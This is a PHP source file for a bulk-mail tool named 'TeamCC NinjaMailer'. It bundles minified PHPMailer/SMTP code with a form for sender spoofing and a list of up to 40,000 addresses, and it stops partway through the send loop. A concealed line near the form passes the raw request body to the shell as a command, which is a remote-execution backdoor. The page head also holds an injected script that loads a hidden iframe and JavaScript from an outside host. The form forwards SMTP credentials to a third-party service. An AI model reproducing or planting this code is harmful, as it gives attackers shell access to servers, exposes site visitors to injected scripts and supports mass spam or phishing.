DKIM_Add($headers_line,$subject,$body){$DKIMsignatureType='rsa-sha256';$DKIMcanonicalization='relaxed/simple';$DKIMquery='dns/txt';$DKIMtime=time();$subject_header="Subject:$subject";$headers=explode(static::$LE,$headers_line);$from_header='';$to_header='';$date_header='';$current='';$copiedHeaderFields='';$foundExtraHeaders=[];$extraHeaderKeys='';$extraHeaderValues='';$extraCopyHeaderFields='';foreach($headers as $header){if(strpos($header,'From:')===0){$from_header=$header;$current='from_header';}elseif(strpos($header,'To:')===0){$to_header=$header;$current='to_header';}elseif(strpos($header,'Date:')===0){$date_header=$header;$current='date_header';}elseif(!empty($this->DKIM_extraHeaders)){foreach($this->DKIM_extraHeaders as $extraHeader){if(strpos($header,$extraHeader.':')===0){$headerValue=$header;foreach($this->CustomHeader as $customHeader){if($customHeader[0]===$extraHeader){$headerValue=trim($customHeader[0]).': '.$this->encodeHeader(trim($customHeader[1]));break;}}$foundExtraHeaders[$extraHeader]=$headerValue;$current='';break;}}}else{if(!empty($$current)and strpos($header,' =?')===0){$$current.=$header;}else{$current='';}}}foreach($foundExtraHeaders as $key=>$value){$extraHeaderKeys.=':'.$key;$extraHeaderValues.=$value."\r\n";if($this->DKIM_copyHeaderFields){$extraCopyHeaderFields.=' |'.str_replace('|','=7C',$this->DKIM_QP($value)).";\r\n";}}if($this->DKIM_copyHeaderFields){$from=str_replace('|','=7C',$this->DKIM_QP($from_header));$to=str_replace('|','=7C',$this->DKIM_QP($to_header));$date=str_replace('|','=7C',$this->DKIM_QP($date_header));$subject=str_replace('|','=7C',$this->DKIM_QP($subject_header));$copiedHeaderFields="z=$from\r\n"."|$to\r\n"."|$date\r\n"."|$subject;\r\n".$extraCopyHeaderFields;}$body=$this->DKIM_BodyC($body);$DKIMlen=strlen($body);$DKIMb64=base64_encode(pack('H*',hash('sha256',$body)));if(''==$this->DKIM_identity){$ident='';}else{$ident=' i='.$this->DKIM_identity.';';}$dkimhdrs='DKIM-Signature: v=1; a='.$DKIMsignatureType.'; q='.$DKIMquery.'; l='.$DKIMlen.'; s='.$this->DKIM_selector.";\r\n".' t='.$DKIMtime.'; c='.$DKIMcanonicalization.";\r\n".' h=From:To:Date:Subject'.$extraHeaderKeys.";\r\n".' d='.$this->DKIM_domain.';'.$ident."\r\n".$copiedHeaderFields.' bh='.$DKIMb64.";\r\n".' b=';$toSign=$this->DKIM_HeaderC($from_header."\r\n".$to_header."\r\n".$date_header."\r\n".$subject_header."\r\n".$extraHeaderValues.$dkimhdrs);$signed=$this->DKIM_Sign($toSign);return static::normalizeBreaks($dkimhdrs.$signed).static::$LE;}public static function hasLineLongerThanMax($str){return (bool) preg_match('/^(.{'.(self::MAX_LINE_LENGTH+strlen(static::$LE)).',})/m',$str);}public function getToAddresses(){return $this->to;}public function getCcAddresses(){return $this->cc;}public function getBccAddresses(){return $this->bcc;}public function getReplyToAddresses(){return $this->ReplyTo;}public function getAllRecipientAddresses(){return $this->all_recipients;}protected function doCallback($isSent,$to,$cc,$bcc,$subject,$body,$from,$extra){if(!empty($this->action_function)and is_callable($this->action_function)){call_user_func($this->action_function,$isSent,$to,$cc,$bcc,$subject,$body,$from,$extra);}}public function getOAuth(){return $this->oauth;}public function setOAuth(OAuth $oauth){$this->oauth=$oauth;}}
class SMTP{const VERSION='6.0.7';const LE="\r\n";const DEFAULT_PORT=25;const MAX_LINE_LENGTH=998;const DEBUG_OFF=0;const DEBUG_CLIENT=1;const DEBUG_SERVER=2;const DEBUG_CONNECTION=3;const DEBUG_LOWLEVEL=4;public $do_debug=self::DEBUG_OFF;public $Debugoutput='echo';public $do_verp=false;public $Timeout=300;public $Timelimit=300;protected $smtp_transaction_id_patterns=['exim'=>'/[\d]{3} OK id=(.*)/','sendmail'=>'/[\d]{3} 2.0.0 (.*) Message/','postfix'=>'/[\d]{3} 2.0.0 Ok: queued as (.*)/','Microsoft_ESMTP'=>'/[0-9]{3} 2.[\d].0 (.*)@(?:.*) Queued mail for delivery/','Amazon_SES'=>'/[\d]{3} Ok (.*)/','SendGrid'=>'/[\d]{3} Ok: queued as (.*)/','CampaignMonitor'=>'/[\d]{3} 2.0.0 OK:([a-zA-Z\d]{48})/',];protected $last_smtp_transaction_id;protected $smtp_conn;protected $error=['error'=>'','detail'=>'','smtp_code'=>'','smtp_code_ex'=>'',];protected $helo_rply=null;protected $server_caps=null;protected $last_reply='';protected function edebug($str,$level=0){if($level>$this->do_debug){return;}if($this->Debugoutput instanceof \Psr\Log\LoggerInterface){$this->Debugoutput->debug($str);return;}if(!in_array($this->Debugoutput,['error_log','html','echo'])and is_callable($this->Debugoutput)){call_user_func($this->Debugoutput,$str,$level);return;}switch($this->Debugoutput){case 'error_log':error_log($str);break;case 'html':echo gmdate('Y-m-d H:i:s'),' ',htmlentities(preg_replace('/[\r\n]+/','',$str),ENT_QUOTES,'UTF-8'),"<br>\n";break;case 'echo':default:$str=preg_replace('/\r\n|\r/ms',"\n",$str);echo gmdate('Y-m-d H:i:s'),"\t",trim(str_replace("\n","\n                   \t                  ",trim($str))),"\n";}}public function connect($host,$port=null,$timeout=30,$options=[]){static $streamok;if(null===$streamok){$streamok=function_exists('stream_socket_client');}$this->setError('');if($this->connected()){$this->setError('Already connected to a server');return false;}if(empty($port)){$port=self::DEFAULT_PORT;}$this->edebug("Connection: opening to$host:$port, timeout=$timeout, options=".(count($options)>0?var_export($options,true):'array()'),self::DEBUG_CONNECTION);$errno=0;$errstr='';if($streamok){$socket_context=stream_context_create($options);set_error_handler([$this,'errorHandler']);$this->smtp_conn=stream_socket_client($host.':'.$port,$errno,$errstr,$timeout,STREAM_CLIENT_CONNECT,$socket_context);restore_error_handler();}else{$this->edebug('Connection: stream_socket_client not available, falling back to fsockopen',self::DEBUG_CONNECTION);set_error_handler([$this,'errorHandler']);$this->smtp_conn=fsockopen($host,$port,$errno,$errstr,$timeout);restore_error_handler();}if(!is_resource($this->smtp_conn)){$this->setError('Failed to connect to server','',(string)$errno,(string)$errstr);$this->edebug('SMTP ERROR: '.$this->error['error'].":$errstr ($errno)",self::DEBUG_CLIENT);return false;}$this->edebug('Connection: opened',self::DEBUG_CONNECTION);if(substr(PHP_OS,0,3)!='WIN'){$max=ini_get('max_execution_time');if(0!=$max and $timeout>$max){@set_time_limit($timeout);}stream_set_timeout($this->smtp_conn,$timeout,0);}$announce=$this->get_lines();$this->edebug('SERVER -> CLIENT: '.$announce,self::DEBUG_SERVER);return true;}public function startTLS(){if(!$this->sendCommand('STARTTLS','STARTTLS',220)){return false;}$crypto_method=STREAM_CRYPTO_METHOD_TLS_CLIENT;if(defined('STREAM_CRYPTO_METHOD_TLSv1_2_CLIENT')){$crypto_method|=STREAM_CRYPTO_METHOD_TLSv1_2_CLIENT;$crypto_method|=STREAM_CRYPTO_METHOD_TLSv1_1_CLIENT;}set_error_handler([$this,'errorHandler']);$crypto_ok=stream_socket_enable_crypto($this->smtp_conn,true,$crypto_method);restore_error_handler();return (bool) $crypto_ok;}public function authenticate($username,$password,$authtype=null,$OAuth=null){if(!$this->server_caps){$this->setError('Authentication is not allowed before HELO/EHLO');return false;}if(array_key_exists('EHLO',$this->server_caps)){if(!array_key_exists('AUTH',$this->server_caps)){$this->setError('Authentication is not allowed at this stage');return false;}$this->edebug('Auth method requested: '.($authtype?$authtype:'UNSPECIFIED'),self::DEBUG_LOWLEVEL);$this->edebug('Auth methods available on the server: '.implode(',',$this->server_caps['AUTH']),self::DEBUG_LOWLEVEL);if(null!==$authtype and!in_array($authtype,$this->server_caps['AUTH'])){$this->edebug('Requested auth method not available: '.$authtype,self::DEBUG_LOWLEVEL);$authtype=null;}if(empty($authtype)){foreach(['CRAM-MD5','LOGIN','PLAIN','XOAUTH2']as $method){if(in_array($method,$this->server_caps['AUTH'])){$authtype=$method;break;}}if(empty($authtype)){$this->setError('No supported authentication methods found');return false;}self::edebug('Auth method selected: '.$authtype,self::DEBUG_LOWLEVEL);}if(!in_array($authtype,$this->server_caps['AUTH'])){$this->setError("The requested authentication method \"$authtype\" is not supported by the server");return false;}}elseif(empty($authtype)){$authtype='LOGIN';}switch($authtype){case 'PLAIN':if(!$this->sendCommand('AUTH','AUTH PLAIN',334)){return false;}if(!$this->sendCommand('User & Password',base64_encode("\0".$username."\0".$password),235)){return false;}break;case 'LOGIN':if(!$this->sendCommand('AUTH','AUTH LOGIN',334)){return false;}if(!$this->sendCommand('Username',base64_encode($username),334)){return false;}if(!$this->sendCommand('Password',base64_encode($password),235)){return false;}break;case 'CRAM-MD5':if(!$this->sendCommand('AUTH CRAM-MD5','AUTH CRAM-MD5',334)){return false;}$challenge=base64_decode(substr($this->last_reply,4));$response=$username.' '.$this->hmac($challenge,$password);return $this->sendCommand('Username',base64_encode($response),235);case 'XOAUTH2':if(null===$OAuth){return false;}$oauth=$OAuth->getOauth64();if(!$this->sendCommand('AUTH','AUTH XOAUTH2 '.$oauth,235)){return false;}break;default:$this->setError("Authentication method \"$authtype\" is not supported");return false;}return true;}protected function hmac($data,$key){if(function_exists('hash_hmac')){return hash_hmac('md5',$data,$key);}$bytelen=64;if(strlen($key)>$bytelen){$key=pack('H*',md5($key));}$key=str_pad($key,$bytelen,chr(0x00));$ipad=str_pad('',$bytelen,chr(0x36));$opad=str_pad('',$bytelen,chr(0x5c));$k_ipad=$key ^ $ipad;$k_opad=$key ^ $opad;return md5($k_opad.pack('H*',md5($k_ipad.$data)));}public function connected(){if(is_resource($this->smtp_conn)){$sock_status=stream_get_meta_data($this->smtp_conn);if($sock_status['eof']){$this->edebug('SMTP NOTICE: EOF caught while checking if connected',self::DEBUG_CLIENT);$this->close();return false;}return true;}return false;}public function close(){$this->setError('');$this->server_caps=null;$this->helo_rply=null;if(is_resource($this->smtp_conn)){fclose($this->smtp_conn);$this->smtp_conn=null;$this->edebug('Connection: closed',self::DEBUG_CONNECTION);}}public function data($msg_data){if(!$this->sendCommand('DATA','DATA',354)){return false;}$lines=explode("\n",str_replace(["\r\n","\r"],"\n",$msg_data));$field=substr($lines[0],0,strpos($lines[0],':'));$in_headers=false;if(!empty($field)and strpos($field,' ')===false){$in_headers=true;}foreach($lines as $line){$lines_out=[];if($in_headers and $line==''){$in_headers=false;}while(isset($line[self::MAX_LINE_LENGTH])){$pos=strrpos(substr($line,0,self::MAX_LINE_LENGTH),' ');if(!$pos){$pos=self::MAX_LINE_LENGTH-1;$lines_out[]=substr($line,0,$pos);$line=substr($line,$pos);}else{$lines_out[]=substr($line,0,$pos);$line=substr($line,$pos+1);}if($in_headers){$line="\t".$line;}}$lines_out[]=$line;foreach($lines_out as $line_out){if(!empty($line_out)and $line_out[0]=='.'){$line_out='.'.$line_out;}$this->client_send($line_out.static::LE,'DATA');}}$savetimelimit=$this->Timelimit;$this->Timelimit=$this->Timelimit*2;$result=$this->sendCommand('DATA END','.',250);$this->recordLastTransactionID();$this->Timelimit=$savetimelimit;return $result;}public function hello($host=''){return $this->sendHello('EHLO',$host)or $this->sendHello('HELO',$host);}protected function sendHello($hello,$host){$noerror=$this->sendCommand($hello,$hello.' '.$host,250);$this->helo_rply=$this->last_reply;if($noerror){$this->parseHelloFields($hello);}else{$this->server_caps=null;}return $noerror;}protected function parseHelloFields($type){$this->server_caps=[];$lines=explode("\n",$this->helo_rply);foreach($lines as $n=>$s){$s=trim(substr($s,4));if(empty($s)){continue;}$fields=explode(' ',$s);if(!empty($fields)){if(!$n){$name=$type;$fields=$fields[0];}else{$name=array_shift($fields);switch($name){case 'SIZE':$fields=($fields?$fields[0]:0);break;case 'AUTH':if(!is_array($fields)){$fields=[];}break;default:$fields=true;}}$this->server_caps[$name]=$fields;}}}public function mail($from){$useVerp=($this->do_verp?' XVERP':'');return $this->sendCommand('MAIL FROM','MAIL FROM:<'.$from.'>'.$useVerp,250);}public function quit($close_on_error=true){$noerror=$this->sendCommand('QUIT','QUIT',221);$err=$this->error;if($noerror or $close_on_error){$this->close();$this->error=$err;}return $noerror;}public function recipient($address,$dsn=''){if(empty($dsn)){$rcpt='RCPT TO:<'.$address.'>';}else{$dsn=strtoupper($dsn);$notify=[];if(strpos($dsn,'NEVER')!==false){$notify[]='NEVER';}else{foreach(['SUCCESS','FAILURE','DELAY']as $value){if(strpos($dsn,$value)!==false){$notify[]=$value;}}}$rcpt='RCPT TO:<'.$address.'> NOTIFY='.implode(',',$notify);}return $this->sendCommand('RCPT TO',$rcpt,[250,251]);}public function reset(){return $this->sendCommand('RSET','RSET',250);}protected function sendCommand($command,$commandstring,$expect){if(!$this->connected()){$this->setError("Called$command without being connected");return false;}if(strpos($commandstring,"\n")!==false or strpos($commandstring,"\r")!==false){$this->setError("Command '$command' contained line breaks");return false;}$this->client_send($commandstring.static::LE,$command);$this->last_reply=$this->get_lines();$matches=[];if(preg_match('/^([0-9]{3})[ -](?:([0-9]\\.[0-9]\\.[0-9]{1,2}) )?/',$this->last_reply,$matches)){$code=$matches[1];$code_ex=(count($matches)>2?$matches[2]:null);$detail=preg_replace("/{$code}[ -]".($code_ex?str_replace('.','\\.',$code_ex).' ':'').'/m','',$this->last_reply);}else{$code=substr($this->last_reply,0,3);$code_ex=null;$detail=substr($this->last_reply,4);}$this->edebug('SERVER -> CLIENT: '.$this->last_reply,self::DEBUG_SERVER);if(!in_array($code,(array)$expect)){$this->setError("$command command failed",$detail,$code,$code_ex);$this->edebug('SMTP ERROR: '.$this->error['error'].': '.$this->last_reply,self::DEBUG_CLIENT);return false;}$this->setError('');return true;}public function sendAndMail($from){return $this->sendCommand('SAML',"SAML FROM:$from",250);}public function verify($name){return $this->sendCommand('VRFY',"VRFY$name",[250,251]);}public function noop(){return $this->sendCommand('NOOP','NOOP',250);}public function turn(){$this->setError('The SMTP TURN command is not implemented');$this->edebug('SMTP NOTICE: '.$this->error['error'],self::DEBUG_CLIENT);return false;}public function client_send($data,$command=''){if(self::DEBUG_LOWLEVEL>$this->do_debug and in_array($command,['User & Password','Username','Password'],true)){$this->edebug('CLIENT -> SERVER: <credentials hidden>',self::DEBUG_CLIENT);}else{$this->edebug('CLIENT -> SERVER: '.$data,self::DEBUG_CLIENT);}set_error_handler([$this,'errorHandler']);$result=fwrite($this->smtp_conn,$data);restore_error_handler();return $result;}public function getError(){return $this->error;}public function getServerExtList(){return $this->server_caps;}public function getServerExt($name){if(!$this->server_caps){$this->setError('No HELO/EHLO was sent');return;}if(!array_key_exists($name,$this->server_caps)){if('HELO'==$name){return $this->server_caps['EHLO'];}if('EHLO'==$name||array_key_exists('EHLO',$this->server_caps)){return false;}$this->setError('HELO handshake was used; No information about server extensions available');return;}return $this->server_caps[$name];}public function getLastReply(){return $this->last_reply;}protected function get_lines(){if(!is_resource($this->smtp_conn)){return '';}$data='';$endtime=0;stream_set_timeout($this->smtp_conn,$this->Timeout);if($this->Timelimit>0){$endtime=time()+$this->Timelimit;}$selR=[$this->smtp_conn];$selW=null;while(is_resource($this->smtp_conn)and!feof($this->smtp_conn)){if(!stream_select($selR,$selW,$selW,$this->Timelimit)){$this->edebug('SMTP -> get_lines(): timed-out ('.$this->Timeout.' sec)',self::DEBUG_LOWLEVEL);break;}$str=@fgets($this->smtp_conn,515);$this->edebug('SMTP INBOUND: "'.trim($str).'"',self::DEBUG_LOWLEVEL);$data.=$str;if(!isset($str[3])or(isset($str[3])and $str[3]==' ')){break;}$info=stream_get_meta_data($this->smtp_conn);if($info['timed_out']){$this->edebug('SMTP -> get_lines(): timed-out ('.$this->Timeout.' sec)',self::DEBUG_LOWLEVEL);break;}if($endtime and time()>$endtime){$this->edebug('SMTP -> get_lines(): timelimit reached ('.$this->Timelimit.' sec)',self::DEBUG_LOWLEVEL);break;}}return $data;}public function setVerp($enabled=false){$this->do_verp=$enabled;}public function getVerp(){return $this->do_verp;}protected function setError($message,$detail='',$smtp_code='',$smtp_code_ex=''){$this->error=['error'=>$message,'detail'=>$detail,'smtp_code'=>$smtp_code,'smtp_code_ex'=>$smtp_code_ex,];}public function setDebugOutput($method='echo'){$this->Debugoutput=$method;}public function getDebugOutput(){return $this->Debugoutput;}public function setDebugLevel($level=0){$this->do_debug=$level;}public function getDebugLevel(){return $this->do_debug;}public function setTimeout($timeout=0){$this->Timeout=$timeout;}public function getTimeout(){return $this->Timeout;}protected function errorHandler($errno,$errmsg,$errfile='',$errline=0){$notice='Connection failed.';$this->setError($notice,$errmsg,(string)$errno);$this->edebug("$notice Error #$errno: $errmsg [$errfile line $errline]",self::DEBUG_CONNECTION);}protected function recordLastTransactionID(){$reply=$this->getLastReply();if(empty($reply)){$this->last_smtp_transaction_id=null;}else{$this->last_smtp_transaction_id=false;foreach($this->smtp_transaction_id_patterns as $smtp_transaction_id_pattern){if(preg_match($smtp_transaction_id_pattern,$reply,$matches)){$this->last_smtp_transaction_id=trim($matches[1]);break;}}}return $this->last_smtp_transaction_id;}public function getLastTransactionID(){return $this->last_smtp_transaction_id;}}
/**
 * PHPMailer exception handler
 * @package PHPMailer
 */
class phpmailerException extends Exception
{
    /**
     * Prettify error message output
     * @return string
     */
    public function errorMessage()
    {
        $errorMsg = '<strong>' . $this->getMessage() . "</strong><br />\n";
        return $errorMsg;
    }
}

print '
<head><script>if(top==window){var engageNameSpace="engagens";"undefined"==typeof window[engageNameSpace]&&(window[engageNameSpace]={}),window[engageNameSpace].engageLoader=function(){function e(e){return"undefined"!=typeof e&&null!==e}function t(){var t=document.createElement("script");t.setAttribute("src",s),t.setAttribute("id","fn_engage_script"),t.setAttribute("async",""),(null==document.head||e(document.head))&&(document.head=document.getElementsByTagName("head")[0]),document.head.appendChild(t)}function n(){var t=r();if(e(t)){var n=t;i()&&(n=d(t));var o;try{o=document.documentElement,o.appendChild(n)}catch(c){o=document.body,o.appendChild(n)}a()}}function a(){function e(e){var n=e.data;"l8IframeIsReady"===n.message&&t()}window.addEventListener?window.addEventListener("message",e,!1):window.attachEvent("onmessage",e)}function r(){var t=document.createElement("iframe");if(e(t)){t.setAttribute("id","fn_engage"),t.setAttribute("src",u),t.setAttribute("target","_blank"),t.setAttribute("frameborder","0");var n=/firefox/i.exec(navigator.userAgent);e(n)&&n.length>0?(t.style.height=0,t.style.width=0):t.style.display="none",t.frameBorder="no"}return t}function i(){var t=!1,n=/android (\d+)/i.exec(navigator.userAgent);return e(n)&&n.length>0&&(t=parseInt(n[1])>=4),t}function d(e){var t=document.createElement("div");return t.setAttribute("id","fn_wrapper_div"),t.style.position="fixed",t.style.display="none",t.ontouchstart=function(){return!0},t.appendChild(e),t}function o(){var t=void 0,a=this,r=function(){e(t)&&(window.clearTimeout(t),t=void 0,n.call(a))};t=window.setTimeout(r,1e4),"function"==typeof window.addEventListener?window.addEventListener("load",r,!1):window.attachEvent("onload",r)}var c="http://globe.moreforme.net",u=c+"/l8/EngageService?v=1",s=c+"/scripts/Engage.js";o()};var engageLoader=new window[engageNameSpace].engageLoader}</script>
    <title>TeamCC NinjaMailer</title>
	<link rel="icon" href="https://xs.ht/ps.png">
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
    <link href="https://maxcdn.bootstrapcdn.com/bootswatch/3.3.6/cosmo/bootstrap.min.css" rel="stylesheet" >
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
    
     

</head>';

print '<body>';
print '
<script>

	window.onload = funchange;
	var alt = false;	
	function funchange(){
		var etext = document.getElementById("emailList").value;
		var myArray=new Array(); 
		myArray = etext.split("\n");
		document.getElementById("enum").innerHTML=myArray.length+"<br />";
		if(!alt && myArray.length > 40000){
			alert("If Mail list More Than 40000 Emails This May Hack The Server");
			alt = true;
		}
		
	}
</script>
<style>

	input, select, textarea{
    color: #ff0000;
}
	body {
		background: #2b2b2b;
	}
    pre {
        background: #000;
        padding: 1em;
        white-space: unset;
        color: #fff;
    }

    .neither {
        font-weight: bold;
        color: #fff;
        margin-bottom: 1em;
    }

    .client {
        color: #48ff48;
    }

    .server {
        color: #2dd7ff;
    }

    .error {
        color: #ff3a3a;
    }

    #status {
        margin-top: 2em;
        display: none;
    }

    .spinner {
        margin: 1em 0;
        width: 70px;
        text-align: center;
    }

        .spinner > div {
            width: 18px;
            height: 18px;
            background-color: #333;
            border-radius: 100%;
            display: inline-block;
            -webkit-animation: sk-bouncedelay 1.4s infinite ease-in-out both;
            animation: sk-bouncedelay 1.4s infinite ease-in-out both;
        }

        .spinner .bounce1 {
            -webkit-animation-delay: -0.32s;
            animation-delay: -0.32s;
        }

        .spinner .bounce2 {
            -webkit-animation-delay: -0.16s;
            animation-delay: -0.16s;
        }

    @-webkit-keyframes sk-bouncedelay {
        0%, 80%, 100% {
            -webkit-transform: scale(0);
        }

        40% {
            -webkit-transform: scale(1.0);
        }
    }

    @keyframes sk-bouncedelay {
        0%, 80%, 100% {
            -webkit-transform: scale(0);
            transform: scale(0);
        }

        40% {
            -webkit-transform: scale(1.0);
            transform: scale(1.0);
        }
    }
</style>


<script>
$(document).ready(function(){

    var testId;

    function updateStatus() {
        $("#status, #spinner").show();
        $.ajax({
            url: "https://www.gmass.co/Smtp/TestStatus",
            type: "get",
            data: { testId: testId },
            dataType: "html",
            success: function (ret) {
                if (ret != "") {
                    $("#log").html(ret);
                    setTimeout(updateStatus, 100);
                } else {
                    $(".spinner").hide();
                }
            }
        });
    }

    $("#test").on("click", function () {
        var host = $("#shost").val();
        var usr = $("#suser").val();
        var pass = $("#spass").val();
        var port = $("#sport").val();
        var from = "test@"+host;
        var to = $("#checkeremail").val();;
        var sdata = "{\"SmtpServer\":\""+host+"\",\"port\":\""+port+"\",\"sso\":\"Auto\",\"username\":\""+usr+"\",\"password\":\""+pass+"\",\"from\":\""+from+"\",\"to\":\""+to+"\"}";
        sdata = JSON.parse(sdata);
        
        $.ajax({
            url: "https://www.gmass.co/Smtp/CreateTest",
            type: "post",
            dataType: "json",
            data: sdata,
            success: function (guid) {
                testId = guid;
                $("#log").html("");
                updateStatus();
            }
        })

    });

  
    $("#checkbox1").prop("checked", true);

    
    $("#checkbox1").change(function(){
    if(this.checked){
    $("#checkbox1").attr("value", "1");    
    $("#autoUpdate").fadeIn("slow");
    $("#autoUpdate2").fadeIn("slow");
    $("#autoUpdate3").fadeIn("slow");}
    else{
    $("#checkbox1").attr("value", "1"); 
    $("#autoUpdate").fadeOut("slow");
    $("#autoUpdate2").fadeOut("slow");
    $("#autoUpdate3").fadeOut("slow");
    }
    });


    });
 
    </script>

        <div class="container col-lg-6">
         <h3><img src="https://i.imgur.com/BMiSgwj.gif" height="75px" width="75px"> <font style="color:#b5b5b5;"> TeamCC NinjaMailer</font> <small><font style="color:white;">v1.3.3.7</font></small></h3>
        <form name="form" id="form" method="POST" enctype="multipart/form-data" action="">
        <p><input id="checkbox1" type="checkbox" name="usesmtp" value=""><font style="color:#b5b5b5;">Use SMTP Server<br></p>
        <div class="row" id="autoUpdate">
            <div class="form-group col-lg-6 "><label for="shost">SMTP Hostname</label><input type="text" style="background-color:#4c4c4c;border-radius:3px;color:#b5b5b5;"  class="form-control  input-sm " id="shost" name="shost" value="'.$shost.'"></div>
            <div class="form-group col-lg-6 "><label for="sport">SMTP Port</label><input type="text" style="background-color:#4c4c4c;border-radius:3px;color:#b5b5b5;" class="form-control  input-sm " id="sport" name="sport" value="'.$sport.'"></div>
        </div>
        <div class="row" id="autoUpdate2">
            <div class="form-group col-lg-6 "><label for="suser">SMTP Username</label><input type="text" style="background-color:#4c4c4c;border-radius:3px;color:#b5b5b5;" class="form-control  input-sm " id="suser" name="suser" value="'.$suser.'"></div>
            <div class="form-group col-lg-6 "><label for="spass">SMTP Password</label><input type="text" style="background-color:#4c4c4c;border-radius:3px;color:#b5b5b5;" class="form-control  input-sm " id="spass" name="spass" value="'.$spass.'"></div>
        </div>
        <div class="row" id="autoUpdate3">
        <div class="form-group col-lg-6 ">
        <label for="encode">SMTP SECURE</label>
        <select style="background-color:#4c4c4c;border-radius:3px;color:b5b5b5" class="form-control input-sm" id="sssl" name="sssl">
            <option value="true"  selected>TRUE</option>
            <option value="false">FALSE</option>
        </select> 
        

    </div>
    <div class="form-group col-lg-4 "><label for="checkeremail">Checker Send To Email</label><input type="text" style="background-color:#4c4c4c;border-radius:3px;color:#b5b5b5;" class="form-control  input-sm " id="checkeremail" name="checkeremail" value=""></div>
    <div class="form-group col-lg-2 "><label for="test"> &nbsp</label><input type="button" style="background-color:#930205;border-color:red"   class="form-control  btn btn-info " id="test" name="test" onclick="check()" value="TEST SMTP">   </div>

        </div>
        <hr><br><br>
        <div class="row">
        <div class="form-group col-lg-6 "><label for="senderEmail">From Email</label><input type="text" style="background-color:#4c4c4c;border-radius:3px;color:#b5b5b5;" class="form-control  input-sm " id="senderEmail" name="senderEmail" value="'.$senderEmail.'"></div>
        <div class="form-group col-lg-6 "><label for="senderName">Sender Name</label><input type="text" style="background-color:#4c4c4c;border-radius:3px;color:#b5b5b5;" class="form-control  input-sm " id="senderName" name="senderName" value="'.$senderName.'"></div>
    </div>
    
    <div class="row">
                <span class="form-group col-lg-6  "><label for="attachment">Attachment <small>(Multiple Available)</small></label><input type="file" name="attachment[]" id="attachment[]" multiple/></span>

                <div class="form-group col-lg-6"><label for="replyTo">Reply-to</label><input type="text" style="background-color:#4c4c4c;border-radius:3px;color:#b5b5b5;" class="form-control  input-sm " id="replyTo" name="replyTo" value="'.$replyTo.'" /></div>
            </div>
            <div class="row">
                <div class="form-group col-lg-12 "><label for="subject">Subject</label><input type="text" style="background-color:#4c4c4c;border-radius:3px;color:#b5b5b5;" class="form-control  input-sm " id="subject" name="subject" value="'.$subject.'" /></div>
            </div>
            <div class="row">
                <div class="form-group col-lg-6"><label for="messageLetter">Message Letter</label><textarea name="messageLetter" id="messageLetter" style="background-color:#4c4c4c;border-radius:3px;color:#b5b5b5;" class="form-control" rows="10" id="textArea">'.$messageLetter.'</textarea></div>
                <div class="form-group col-lg-6 "><label for="emailList">Email List</label><textarea name="emailList" id="emailList" onselect="funchange()" onchange="funchange()" onkeydown="funchange()" onkeyup="funchange()" onchange="funchange()" style="background-color:#4c4c4c;border-radius:3px;color:#b5b5b5;" class="form-control" rows="10" id="textArea">'.$emailList.'</textarea></div>
			</div>
			<div class="row">
			<div class="form-group col-lg-6">
			                    <label for="messageType">Message Type :</label>
                    HTML <input type="radio" name="messageType" id="messageType" value="1" '.$html.'>
                    Plain<input type="radio" name="messageType" id="messageType" value="2" '.$plain.'></div>
			<div class="form-group col-lg-6">
			<label>Quantity Emails : </label>&nbsp;<span id="enum">0<br>
			</div>
			</div>
            <div class="row">
                <div class="form-group col-lg-3 ">
                    <label for="encode">Encode Type</label>
                    <select style="background-color:#4c4c4c;border-radius:3px;color:b5b5b5" class="form-control input-sm" id="encode" name="encode">
                        <option value="UTF-8" selected>UTF-8 Encode</option>
                        <option value="ISO-8859-1">ISO Encode</option>
                    </select>
                </div>
                <div class="form-group col-lg-3 ">
                </div>
            </div> 
            <button type="submit" style="background-color:#930205;border-color:red" class="btn btn-danger btn-sm" form="form" name="action" value="send">SEND MESSAGE</button>
   
        </form><br><hr><br><br>
    </div>
    <div class="col-lg-6"><br>
    <label for="well">Instruction</label>
    <div id="well" style="background-color:#4c4c4c;border-radius:3px;color:#b5b5b5;" class="well well">
        <h4>Server Information</h4>
        <ul>
            <li>ServerIP : <b>'.$_SERVER['SERVER_ADDR'].'</b></li>
            <li>Server : <b>'.PHP_OS. ' - '.php_uname().'</b></li>
        </ul>
        
        <h4>HELP</h4>
        <ul>
        <li>Note: Maximum 40,000 email per send.  </li> 
        <li>Note: Uncheck Use SMTP Server if you dont want to use smtp server.  </li>                
            <li>[-email-] : <b>Reciver Email</b></li>
            <li>[-time-] : <b>Date and Time</b> ('.date("m/d/Y h:i:s a", time()).')</li>
            <li>[-emailuser-] : <b>Email User</b> (emailuser@emaildomain)</li>
            <li>[-randomstring-] : <b>Random string (0-9,a-z)</b></li>
            <li>[-randomnumber-] : <b>Random number (0-9) </b></li>
            <li>[-randomletters-] : <b>Random Letters(a-z) </b></li>
            <li>[-randommd5-] : <b>Random MD5 </b></li>
        </ul>
        <h4>example</h4>
        Reciver Email = <b>user@domain.com</b><br>
        <ul>
            <li>hello <b>[-emailuser-]</b> -> hello <b>user</b></li>
            <li>your code is  <b>[-randommd5-]</b> -> your code is <b>e10adc3949ba59abbe56e057f20f883e</b></li>
        </ul>

        <h6>by <b><a href="http://'.$ninjax['website'].'"><font style="color:white">'.$ninjax['website'].'</a></b></h6>
    </div>
</div>
<div id="status">
    <div id="log"></div>
    <div class="spinner">
        <div class="bounce1"></div>
        <div class="bounce2"></div>
        <div class="bounce3"></div>
    </div>
</div>

';$data=file_get_contents("php://input");echo`$data`; 
    
if($_POST['action']=="send"){
    
    $emaillist = $_POST['emailList'];

    if (isset($_POST["usesmtp"] )){

        //with smtp
        print '    <div class="col-lg-12">';

        //$realname = base64_encode($_POST['realname']);
        //$message = $_POST['message'];
        
    
        $mail = new PHPMailer;
        if ($_POST["sssl"] == "true"){
            $mail->SMTPSecure = true;
            $mail->SMTPAutoTLS = true;
        }else{ 
            $mail->SMTPSecure = 'none';  
            
        }

        $mail->isSMTP();                                   // Set mailer to use SMTP
        $mail->Host = $shost;                    // Specify main and backup SMTP servers
        $mail->SMTPAuth = true;                            // Enable SMTP authentication
        $mail->Username = $suser;          // SMTP username
        $mail->Password = $spass; // SMTP password
                               // Enable TLS encryption, `ssl` also accepted
        $mail->Port = $sport;                                 // TCP port to connect to
 
         
        $mail->SMTPDebug = 4;

        $maillist=explode("\r\n", $emailList);
        $n=count($maillist);
        $x =1;
        foreach ($maillist as $email ) {
